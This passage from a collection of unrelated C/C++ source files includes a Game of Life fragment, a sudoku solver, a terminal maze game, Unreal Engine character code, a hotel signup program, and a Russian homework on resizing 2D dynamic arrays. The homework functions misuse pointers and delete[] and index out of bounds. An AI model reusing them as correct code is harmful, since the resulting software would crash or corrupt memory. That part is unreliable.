{\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i+1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i+1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i+1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif ((x > 0) && (oldPixels[i][x-1])) neighborsAlive++;\r\n\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i][x+1])) neighborsAlive++;\r\n\r\n\t\t\t\tnewPixels[i][x] = true;\r\n\t\t\t\tif (oldPixels[i][x] && !(neighborsAlive == 3)) newPixels[i][x] = false;\r\n\t\t\t\telse if (!oldPixels[i][x] && !((neighborsAlive == 2) || (neighborsAlive == 3))) newPixels[i][x] = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\t// only stay alive at 3 pixels\r\n\t\t\tcase 2: {\r\n\t\t\t\tuint8_t neighborsAlive = 0;\r\n\t\t\t\tif (i > 0) {\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i-1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i-1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i-1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif (i < SCREENHEIGHT/SCALEFACTOR-1) {\r\n\t\t\t\t\tif ((x > 0) && (oldPixels[i+1][x-1])) neighborsAlive++;\r\n\t\t\t\t\tif (oldPixels[i+1][x]) neighborsAlive++;\r\n\t\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i+1][x+1])) neighborsAlive++;\r\n\t\t\t\t}\r\n\t\t\t\tif ((x > 0) && (oldPixels[i][x-1])) neighborsAlive++;\r\n\t\t\t\tif ((x < SCREENWIDTH/SCALEFACTOR-1) && (oldPixels[i][x+1])) neighborsAlive++;\r\n\r\n\t\t\t\tnewPixels[i][x] = true;\r\n\t\t\t\tif (oldPixels[i][x] && !(neighborsAlive == 3)) newPixels[i][x] = false;\r\n\t\t\t\tel",
    "\ufeff// Homework_17.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\nvoid showArray(int*** ar, int rows, int columns); //\u043f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u043c\u0430\u0441\u0441\u0438\u0432\nvoid addRow(int*** ar, int rows, int columns);//\u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0442\u0440\u043e\u043a\u0443\nvoid deleteRow(int*** ar, int rows, int columns);//\u0443\u0434\u0430\u043b\u0438\u0442\u044c \u0441\u0442\u0440\u043e\u043a\u0443\nvoid addColumn(int*** ar, int rows, int columns); //\u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0442\u043e\u043b\u0431\u0435\u0446\nvoid deleteColumn(int*** ar, int rows, int columns); //\u0443\u0434\u0430\u043b\u0438\u0442\u044c \u0441\u0442\u043e\u043b\u0431\u0435\u0446\n\n#include <iostream>\nusing namespace std;\n\nint main()\n{\n    //\u041d\u0430\u043f\u0438\u0441\u0430\u0442\u044c 4 \u0444\u0443\u043d\u043a\u0446\u0438\u0438:\n\n    //\u0417\u0430\u0434\u0430\u043d\u0438\u0435 1. \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u0442 \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u043a\u043e\u043d\u0435\u0446 \u0434\u0432\u0443\u043c\u0435\u0440\u043d\u043e\u0433\u043e \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430. \u041d\u043e\u0432\u044b\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0440\u0430\u0432\u043d\u044b 0.\n\n    //\u0417\u0430\u0434\u0430\u043d\u0438\u0435 2. \u0423\u0434\u0430\u043b\u044f\u0435\u0442 \u0441\u0442\u0440\u043e\u043a\u0443 \u0441 \u043a\u043e\u043d\u0446\u0430 \u0434\u0432\u0443\u043c\u0435\u0440\u043d\u043e\u0433\u043e \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430.\n\n    //\u0417\u0430\u0434\u0430\u043d\u0438\u0435 3. \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u0442 \u0441\u0442\u043e\u043b\u0431\u0435\u0446 \u0432 \u043a\u043e\u043d\u0435\u0446 \u0434\u0432\u0443\u043c\u0435\u0440\u043d\u043e\u0433\u043e \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430. \u041d\u043e\u0432\u044b\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0440\u0430\u0432\u043d\u044b 0.\n\n    //\u0417\u0430\u0434\u0430\u043d\u0438\u0435 4. \u0423\u0434\u0430\u043b\u044f\u0435\u0442 \u0441\u0442\u043e\u043b\u0431\u0435\u0446 \u0441 \u043a\u043e\u043d\u0446\u0430 \u0434\u0432\u0443\u043c\u0435\u0440\u043d\u043e\u0433\u043e \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430.\n\n\n    unsigned int rows = 3;       // \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0442\u0440\u043e\u043a\n    unsigned int columns = 2;    // \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0442\u043e\u043b\u0431\u0446\u043e\u0432\n    \n    int** ar = new int* [rows]; // \u0432\u044b\u0434\u0435\u043b\u044f\u0435\u043c \u043f\u0430\u043c\u044f\u0442\u044c \u043f\u043e\u0434 \u0434\u0432\u0443\u0445\u043c\u0435\u0440\u043d\u044b\u0439 \u043c\u0430\u0441\u0441\u0438\u0432\n    for (int y = 0; y < rows; y++) {\n        ar[y] = new int[columns];\n        for (int x = 0; x < columns; x++) {\n            ar[y][x] = rand() % 100;\n            cout << ar[y][x] << \"\\t\";\n        }\n        cout << \"\\n\\n\";\n    }\n    addRow(&ar, rows, columns);\n    showArray(&ar, rows, columns);\n    \n    deleteRow(&ar, rows, columns);\n    showArray(&ar, rows, columns);\n\n    addColumn(&ar, rows, columns);\n    showArray(&ar, rows, columns);\n    \n    deleteColumn(&ar, rows, columns);\n    showArray(&ar, rows, columns);\n    \n    for (int y = 0; y < rows; y++)\n        delete[]ar[y];\n    delete[]ar;\n    \n}\n\n\nvoid showArray(int*** ar, int rows, int columns) {\n    for (int y = 0; y < rows; y++) {\n        for (int x = 0; x < columns; x++) {\n            (*ar[y][x]) = rand() % 100;\n            cout << (*ar[y][x]) << \"\\t\";\n        }\n    }\n}\n\nvoid addRow(int*** ar, int rows, int columns) {\n    \n    for (int y = 0; y < rows+1; y++) {\n        for (int x = 0; x < columns; x++) {\n            (*ar[y][x]) = 0;\n            cout << (*ar[y][x]) << \"\\t\";\n        }\n        cout << \"\\n\\n\";\n    }\n}\n\nvoid deleteRow(int*** ar, int rows, int columns) { \n\n    for (int y = rows; y > 0; y--) {\n        delete[] ar[y];\n        cout << \"\\n\\n\";\n    }\n}\n\nvoid addColumn(int*** ar, int rows, int columns) {\n\n    for (int y = 0; y < rows; y++) {\n        for (int x = 0; x < columns+1; x++) {\n            (*ar[y][x]) = 0;\n            cout << (*ar[y][x]) << \"\\t\";\n        }\n        cout << \"\\n\\n\";\n    }\n}\n\nvoid deleteColumn(int*** ar, int rows, int columns) {\n    for (int y = 0; y < rows; y++) {\n        for (int x = columns; x > 0; x--) {\n            delete[] ar[y][x];\n            cout << \"\\n\\n\";\n        }\n    }\n}\n\n// \u0417\u0430\u043f\u0443\u0441\u043a \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: CTRL+F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u043a \u0431\u0435\u0437 \u043e\u0442\u043b\u0430\u0434\u043a\u0438\"\n// \u041e\u0442\u043b\u0430\u0434\u043a\u0430 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u043e\u0442\u043b\u0430\u0434\u043a\u0443\"\n\n// \u0421\u043e\u0432\u0435\u0442\u044b \u043f\u043e \u043d\u0430\u0447\u0430\u043b\u0443 \u0440\u0430\u0431\u043e\u0442\u044b \n//   1. \u0412 \u043e\u043a\u043d\u0435 \u043e\u0431\u043e\u0437\u0440\u0435\u0432\u0430\u0442\u0435\u043b\u044f \u0440\u0435\u0448\u0435\u043d\u0438\u0439 \u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u0438 \u0443\u043f\u0440\u0430\u0432\u043b\u044f\u0442\u044c \u0438\u043c\u0438.\n//   2. \u0412 \u043e\u043a\u043d\u0435 Team Explorer \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f \u043a \u0441\u0438\u0441\u0442\u0435\u043c\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0432\u0435\u0440\u0441\u0438\u044f\u043c\u0438.\n//   3. \u0412 \u043e\u043a\u043d\u0435 \"\u0412\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u0432\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0441\u0431\u043e\u0440\u043a\u0438 \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f.\n//   4. \u0412 \u043e\u043a\u043d\u0435 \"\u0421\u043f\u0438\u0441\u043e\u043a \u043e\u0448\u0438\u0431\u043e\u043a\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u043e\u0448\u0438\u0431\u043a\u0438.\n//   5. \u041f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043d\u043e\u0432\u044b\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430, \u0438\u043b\u0438 \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0432 \u043f\u0440\u043e\u0435\u043a\u0442 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0435 \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430.\n//   6. \u0427\u0442\u043e\u0431\u044b \u0441\u043d\u043e\u0432\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u044d\u0442\u043e\u0442 \u043f\u0440\u043e\u0435\u043a\u0442 \u043f\u043e\u0437\u0436\u0435, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u0424\u0430\u0439\u043b\" > \"\u041e\u0442\u043a\u0440\u044b\u0442\u044c\" > \"\u041f\u0440\u043e\u0435\u043a\u0442\" \u0438 \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 SLN-\u0444\u0430\u0439\u043b.\n",
    "#include<iostream>\r\nusing namespace std;\r\nint g[10][10];\r\n\r\nbool ok(int u, int x, int y)\r\n{\r\n\r\n\tfor (int i = 0; i < 9; i++)\r\n\t{\r\n\t\tif (g[x][i] == u || g[i][y] == u)\r\n\t\t\treturn false;\r\n\t}\r\n\tx = x / 3 * 3;\r\n\ty = y / 3 * 3;\r\n\t//\u786e\u4fdd\u4e5d\u5bab\u683c\u5185\u65e0\u76f8\u540c\u6570\u5b57 \r\n\tfor (int j = x; j < x + 3; j++)\r\n\t{\r\n\t\tfor (int k = y; k < y + 3; k++)\r\n\t\t{\r\n\t\t\tif (g[j][k] == u)return false;\r\n\t\t}\r\n\t}\r\n\treturn true;\r\n\r\n}\r\n//\u641c\u7d22\u51fd\u6570 \r\nvoid dfs(int x, int y)\r\n{\r\n\tif (x == 9 && y == 0)\r\n\t{\r\n\t\tfor (int i = 0; i < 9; i++)\r\n\t\t{\r\n\t\t\tfor (int j = 0; j < 9; j++)\r\n\t\t\t{\r\n\t\t\t\tif (j)cout << \" \";\r\n\t\t\t\tcout << g[i][j];\r\n\t\t\t}\r\n\t\t\tputs(\"\");\r\n\t\t}\r\n\t\treturn;\r\n\t}\r\n\tif (y == 9)dfs(x + 1, 0);//\u6362\u884c \r\n\telse\r\n\t{//\u5224\u65ad\u8fd9\u4e00\u884c\u4e0a\u662f\u5426\u6709\u76f8\u540c\u7684\u6570\u5b57 \r\n\t\tif (g[x][y])\r\n\t\t\tdfs(x, y + 1);\r\n\t\telse\r\n\t\t{\r\n\t\t\tfor (int i = 0; i <= 9; i++)//\u4ece\u4e00\u5230\u4e5d\u679a\u4e3e\r\n\t\t\t\tif (ok(i, x, y))\r\n\t\t\t\t{\r\n\t\t\t\t\tg[x][y] = i;\r\n\t\t\t\t\tdfs(x, y + 1);\r\n\t\t\t\t\tg[x][y] = 0;\r\n\t\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\nint main() {\r\n\r\n\tfor (int i = 0; i < 9; i++)\r\n\t\tfor (int j = 0; j < 9; j++)\r\n\t\t\tcin >> g[i][j];\r\n\tdfs(0, 0);\r\n\treturn 0;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
    "#include <random>\n#include <chrono>\n#include <map>\n#include <iostream>\n#include <queue>\n#include <cstring>\n#include <vector>\n#include <algorithm>\n\n#define LEFT_ARROW 68\n#define UP_ARROW 65\n#define RIGHT_ARROW 67\n#define DOWN_ARROW 66\n\n#define LINE_SIZE \"stty size | cut -d' ' -f1\"\n#define COLUMN_SIZE \"stty size | cut -d' ' -f2\"\n\n#define fundo0 \"  \"\n#define fundo1 \"\\033[0;40m  \\033[0m\"\n#define parede \"\\033[0;47m  \\033[0m\"\n#define player0 \"\\033[48;2;80;200;200m  \\033[0m\"\n#define player1 \"\\033[0;42m  \\033[0m\"\n#define coletavel \"\\033[48;2;242;238;2m  \\033[0m\"\n#define fim \"\\033[48;2;180;20;255m  \\033[0m\"\n\nstd::mt19937 rng(std::chrono::steady_clock::now().time_since_epoch().count());\n\nstd::map<char, int> dictx = {{UP_ARROW, -1}, {DOWN_ARROW, +1}, {'w', -1}, {'s', +1}};\nstd::map<char, int> dicty = {{LEFT_ARROW, -1}, {RIGHT_ARROW, +1}, {'a', -1}, {'d', +1}};\n\nint dx[4]={0, 1, 0, -1}, dy[4]={1, 0, -1, 0};\n\nstd::vector<std::vector<int>> mapa;\n\nbool coletou, acabou;\n\nint columns, lines;\n\nstd::pair<int,int> pos;\n\nint16_t getTerminalSize(std::string command) {\n    FILE* fpipe = popen(command.c_str(), \"r\");\n\n\tchar buffer[128];\n\n    int a = atoi(fgets(buffer, 128, fpipe));\n\n    pclose(fpipe);\n    return a;\n}\n\nvoid move(int ox, int oy){\n\tif(mapa[ox][oy] == 1 || (mapa[ox][oy] == 4 && !coletou))return;\n\telse if(mapa[ox][oy] == 4)acabou=true;\n\telse if(mapa[ox][oy] == 3)coletou=true;\n\n\tmapa[pos.first][pos.second] = 0;\n\tmapa[ox][oy] = 2;\n\tpos=std::make_pair(ox, oy);\n}\n\nvoid imprime(){\n\tsystem(\"clear\");\n\n\tstd::cout << (coletou ? \"va para o bloco roxo para ganhar\" : \"colete o bloco amarelo\") << \"\\n\\n\";\n\n\tfor(int i = 0; i <= lines+1; i++){\n\t\tfor(int j = 0; j <= columns+1; j++){\n\t\t\tif(mapa[i][j] == 0) {\n\t\t\t\tstd::cout << (((i+j)%2) ? fundo1 : fundo0);\n\t\t\t}\n\t\t\telse if(mapa[i][j] == 1) {\n\t\t\t\tstd::cout << parede;\n\t\t\t}\n\t\t\telse if(mapa[i][j] == 2) {\n\t\t\t\tstd::cout << (coletou ? player1 : player0);\n\t\t\t}\n\t\t\telse if(mapa[i][j] == 3) {\n\t\t\t\tstd::cout << coletavel;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tstd::cout << fim;\n\t\t\t}\n\t\t}\n\t\tstd::cout << '\\n';\n\t}\n\tstd::cout << '\\n';\n}\n\nbool caminho(std::pair<int,int> ini, std::pair<int,int> obj){\n\tstd::vector<std::vector<std::pair<int,int>>> pai;\n\tpai.resize(lines+2);\n\n\tfor(int i = 0; i <= lines+1; i++){\n\t\tpai[i].resize(columns+2);\n\t\tfor(int j = 0; j <= columns+1; j++)\n\t\t\tpai[i][j] = std::make_pair(-1, -1);\n\t}\n\n\tpai[ini.first][ini.second] = std::make_pair(0, 0);\n\n\tstd::queue<std::pair<int,int>> q;\n\tq.push(ini);\n\n\twhile(q.size()){\n\t\tint cx = q.front().first, cy = q.front().second;\n\t\tq.pop();\n\n\t\tif(cx == obj.first && cy == obj.second)break;\n\n\t\tfor(int p = 0; p < 4; p++){\n\t\t\tint nx = cx+dx[p], ny = cy+dy[p];\n\n\t\t\tif(pai[nx][ny].first != -1 || mapa[nx][ny] == 1 || (mapa[nx][ny] == 4 && (nx != obj.first || ny != obj.second)))continue;\n\n\t\t\tpai[nx][ny] = std::make_pair(cx, cy);\n\t\t\tq.push({nx, ny});\n\t\t}\n\t}\n\n\treturn (pai[obj.first][obj.second].first != -1);\n}\n\nchar keyboard_input(){\n\tsystem(\"stty raw -echo\");\n\n\tchar inp = (char) std::cin.get();\n\n\tsystem(\"stty cooked echo\");\n\n\treturn inp;\n}\n\nvoid gerar_mapa(){\n\tmapa.resize(lines+2);\n\n\tfor(int i = 0; i <= lines+1; i++)\n\t\tmapa[i].resize(columns+2);\n\n\twhile(1){\n\t\tfor(int i = 0; i <= lines+1; i++)\n\t\t\tfor(int j = 0; j <= columns+1; j++)\n\t\t\t\tmapa[i][j] = 0;\n\n\t\tcoletou = false, acabou = false;\n\n\n\t\tfor(int i = 0; i <= lines+1; i++){\n\t\t\tmapa[i][0] = 1;\n\t\t\tmapa[i][columns+1] = 1;\n\t\t}\n\t\tfor(int j = 0; j <= columns+1; j++){\n\t\t\tmapa[0][j] = 1;\n\t\t\tmapa[lines+1][j] = 1;\n\t\t}\n\n\n\t\tstd::vector<std::pair<int,int>> pontos;\n\n\t\tfor(int i = 1; i <= lines; i++)\n\t\t\tfor(int j = 1; j <= columns; j++)\n\t\t\t\tpontos.push_back({i, j});\n\n\t\tstd::shuffle(pontos.begin(), pontos.end(), rng);\n\n\t\tmapa[pontos[0].first][pontos[0].second] = 2;\n\t\tmapa[pontos[1].first][pontos[1].second] = 3;\n\t\tmapa[pontos[2].first][pontos[2].second] = 4;\n\n\t\tpos = pontos[0];\n\n\t\tint qtd = (int)(0.4*lines*columns), ptr = 3;\n\n\t\twhile(qtd--){\t\t\n\t\t\tmapa[pontos[ptr].first][pontos[ptr].second] = 1;\n\t\t\tptr++;\n\t\t}\n\n\t\tif(!caminho(pontos[0], pontos[1]) || !caminho(pontos[0], pontos[2]))continue;\n\n\t\tbreak;\n\t}\n}\n\nint main(){\n\tfor (uint8_t i = 1; true; i++){\n\t\tcolumns = std::max(getTerminalSize(COLUMN_SIZE)/2-2, 14);\n\t\tlines = std::max(getTerminalSize(LINE_SIZE)-7, 4);\n\n\t\tif(lines*5 < columns)columns = lines*5;\n\t\telse if(columns*5 < lines)lines = columns*5;\n\n\t\tgerar_mapa();\n\t\t\n\t\timprime();\n\t\tstd::cout << \"\\033[31mRound:\\t\" << (int)i << \"\\033[0m\" << '\\n';\n\n\t\twhile(!acabou){\n\t\t\tchar inp = keyboard_input();\n\n\t\t\tif (inp == 3) {\n\t\t\t\treturn 0;\n\t\t\t}\n\n\t\t\tint nx = pos.first + dictx[inp], ny = pos.second + dicty[inp];\n\n\t\t\tmove(nx, ny);\n\t\t\n\t\t\timprime();\n\t\t\tstd::cout << \"\\033[31mRound:\\t\" << (int)i << \"\\033[0m\" << '\\n';\n\n\t\t}\n\n\t}\n\t\n\treturn 0;\n}\n",
    "// Copyright INVI1998\n\n\n#include \"Character/AuraCharacter.h\"\n\n#include \"AbilitySystemComponent.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"Player/AuraPlayerController.h\"\n#include \"Player/AuraPlayerState.h\"\n#include \"UI/HUD/AuraHUD.h\"\n\nAAuraCharacter::AAuraCharacter()\n{\n\tGetCharacterMovement()->bOrientRotationToMovement = true;\t// \u5f00\u542f\u79fb\u52a8\u65f6\u65cb\u8f6c\n\tGetCharacterMovement()->RotationRate = FRotator(0.0f, 400.0f, 0.0f);\t// \u8bbe\u7f6e\u65cb\u8f6c\u901f\u7387\n\tGetCharacterMovement()->bConstrainToPlane = true;\t// \u5f00\u542f\u9650\u5236\u79fb\u52a8\u5230\u5e73\u9762\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u6c34\u5e73\u9762\u4e0a\u79fb\u52a8\uff0c\u800c\u4e0d\u662f\u5728\u7a7a\u4e2d\u79fb\u52a8\n\tGetCharacterMovement()->bSnapToPlaneAtStart = true;\t// \u5f00\u542f\u5728\u5f00\u59cb\u65f6\u5c31\u9650\u5236\u79fb\u52a8\u5230\u5e73\u9762\n\n\tbUseControllerRotationPitch = false;\t// \u5173\u95ed\u63a7\u5236\u5668\u65cb\u8f6c\u4fef\u4ef0, \u8fd9\u6837\u6211\u4eec\u5c31\u4e0d\u80fd\u62ac\u8d77\u6216\u8005\u4f4e\u4e0b\u5934\u90e8\uff0c\u53ea\u80fd\u5de6\u53f3\u65cb\u8f6c\uff0c\u8fd9\u5bf9\u4e8e\u4fef\u89c6\u89d2\u6e38\u620f\u6765\u8bf4\u662f\u5f88\u597d\u7684\n\tbUseControllerRotationYaw = false;\t// \u5173\u95ed\u63a7\u5236\u5668\u65cb\u8f6c\u504f\u822a, \u8fd9\u6837\u6211\u4eec\u5c31\u4e0d\u80fd\u5de6\u53f3\u65cb\u8f6c\n\tbUseControllerRotationRoll = false;\t// \u5173\u95ed\u63a7\u5236\u5668\u65cb\u8f6c\u7ffb\u6eda, \u8fd9\u6837\u6211\u4eec\u5c31\u4e0d\u80fd\u7ffb\u6eda\n}\n\nvoid AAuraCharacter::PossessedBy(AController* NewController)\n{\n\t// \u8be5\u51fd\u6570\u53ea\u4f1a\u5728\u670d\u52a1\u5668\u7aef\u88ab\u8c03\u7528\n\t// PossessedBy()\u51fd\u6570\u901a\u5e38\u5728\u670d\u52a1\u5668\u7aef\u88ab\u8c03\u7528\u3002\u5f53\u4e00\u4e2aController\uff08\u5982PlayerController\u6216AIController\uff09\u5f00\u59cb\u63a7\u5236\u4e00\u4e2aPawn\uff08\u5982PlayerCharacter\u6216AICharacter\uff09\u65f6\uff0c\u670d\u52a1\u5668\u4f1a\u8c03\u7528PossessedBy()\u51fd\u6570\u6765\u8bbe\u7f6ePawn\u7684Controller\u5c5e\u6027\u3002\n\tSuper::PossessedBy(NewController);\n\n\t// \u4e3a\u670d\u52a1\u5668\u521d\u59cb\u5316AbilitySystemComponent\n\tInitAbilityActorInfo();\n\t\n}\n\nvoid AAuraCharacter::OnRep_PlayerState()\n{\n\tSuper::OnRep_PlayerState();\n\n\t// \u4e3a\u5ba2\u6237\u7aef\u521d\u59cb\u5316AbilitySystemComponent\n\tInitAbilityActorInfo();\n}\n\nvoid AAuraCharacter::InitAbilityActorInfo()\n{\n\tAAuraPlayerState* AuraPlayerState = GetPlayerState<AAuraPlayerState>();\n\tcheck(AuraPlayerState);\n\tAuraPlayerState->GetAbilitySystemComponent()->InitAbilityActorInfo(AuraPlayerState, this);\t// \u521d\u59cb\u5316\u6280\u80fd\u7cfb\u7edf\u7ec4\u4ef6\n\tAbilitySystemComponent = AuraPlayerState->GetAbilitySystemComponent();\t// \u83b7\u53d6\u6280\u80fd\u7cfb\u7edf\u7ec4\u4ef6\n\tAttributeSet = AuraPlayerState->GetAttributeSet();\t// \u83b7\u53d6\u5c5e\u6027\u96c6\n\n\t// \u5f88\u591a\u4eba\u7ea0\u7ed3\u5230\u5e95\u5728\u4ec0\u4e48\u60c5\u51b5\u4e0b\u5e94\u8be5\u65ad\u8a00PlayerController*\uff0c\u4ec0\u4e48\u65f6\u5019\u53ea\u9700\u8981\u5224\u65ad\u6307\u9488\u662f\u5426\u4e3a\u7a7a\uff1f\n\t// \u56e0\u4e3a\u6211\u4eec\u8fd9\u4e2a\u662f\u4e00\u4e2a\u591a\u4eba\u6e38\u620f\uff0c\u800c\u63a7\u5236\u5668\u5728\u5ba2\u6237\u7aef\u53ea\u6709\u81ea\u5df1\u89d2\u8272\u7684\u63a7\u5236\u5668\uff0c\u5176\u4ed6\u89d2\u8272\u7684\u63a7\u5236\u5668\u662f\u7a7a\u7684\uff0c\u670d\u52a1\u7aef\u6709\u6240\u6709\u89d2\u8272\u7684\u63a7\u5236\u5668\u3002\n\t// \u6240\u4ee5\u63a7\u5236\u5668\u8fd9\u4e2a\u6307\u9488\u662f\u4f1a\u5b58\u5728\u7a7a\u7684\u60c5\u51b5\u7684\uff0c\u8fd9\u662f\u6b63\u5e38\u7684\uff0c\u8bf4\u660e\u8fd9\u4e2a\u63a7\u5236\u5668\u4e0d\u662f\u81ea\u5df1\u7684\u63a7\u5236\u5668\u3002\n\t// \u6240\u4ee5\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6211\u4eec\u53ea\u9700\u8981\u5224\u65ad\u6307\u9488\u662f\u5426\u4e3a\u7a7a\u5c31\u53ef\u4ee5\u4e86\uff0c\u4e0d\u9700\u8981\u65ad\u8a00\u3002\n\tif (AAuraPlayerController* AuraPlayerController = Cast<AAuraPlayerController>(GetController()))\n\t{\n\t\tif (AAuraHUD* AuraHUD = Cast<AAuraHUD>(AuraPlayerController->GetHUD()))\n\t\t{\n\t\t\tAuraHUD->InitOverlay(AuraPlayerController, AuraPlayerState, AbilitySystemComponent, AttributeSet);\n\t\t}\n\t}\n\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nclass Hotel{\r\n\tint age;\r\n\tint member;\r\n\tpublic:\r\n\t\tstring name;\r\n\t\tstring user,   user1;\r\n\t\tstring pass, pass1;\r\n\t\tstring mail;\r\n\t\t\r\n\t\tHotel(int m=0, int a=0)\r\n\t\t{\r\n\t\t   member=m;\r\n\t\t   age=a;\t\r\n\t\t}\r\n\t\t void Signup(Hotel& h1);\r\n\t\t void Login(Hotel& h1);\r\n\t\t\r\n\t\t\r\n};\r\n\r\nvoid Hotel::Signup(Hotel &h) {\r\n    cout << \"     * * * * * * * * * *     \" << endl;\r\n    cout << \"     *                 *     \" << endl;\r\n    cout << \"     *     SIGNUP      *     \" << endl;\r\n    cout << \"     *                 *     \" << endl;\r\n    cout << \"     * * * * * * * * * *     \" << endl;\r\n\r\n    cout << \"Enter your name: \";\r\n    getline(cin, h.name);\r\n    cout << \"Enter your username: \";\r\n    cin >> h.user1;\r\n    cout << \"Enter your email: \";\r\n    cin >> h.mail;\r\n    cout << \"Enter your age: \";\r\n    cin >> h.age;\r\n    cout << \"Create your password: \";\r\n    cin >> h.pass;\r\n    do {\r\n        cout << \"Confirm your password: \";\r\n        cin >> h.pass1;\r\n\r\n        if (h.pass == h.pass1) {\r\n            cout << \"SIGN UP SUCCESSFUL\" << endl;\r\n            //h.Login(h);\r\n            break; // Exit the loop after successful signup\r\n        } else {\r\n            cout << \"Passwords do not match. Please try again.\" << endl;\r\n        }\r\n    } while (h.pass != h.pass1); // Loop until a successful signup\r\n}\r\n\r\nvoid Hotel::Login(Hotel& h1)\r\n\t\t{\r\n\t\t\tcout<<\"     * * * * * * * * * *     